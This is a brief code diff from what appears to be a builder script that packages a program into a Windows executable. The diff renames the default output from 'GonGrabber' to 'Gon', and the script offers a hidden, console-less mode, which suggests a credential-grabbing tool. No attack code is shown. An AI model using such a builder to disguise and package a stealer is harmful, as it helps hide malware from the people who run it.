@@ -8,7 +8,7 @@ def create_executable():
     
     name = input("Executable name (without .exe): ").strip()
     if not name:
-        name = "GonGrabber"
+        name = "Gon"
     
     print("\nExecution mode:")
     print("1 - Hidden Mode (no console)")
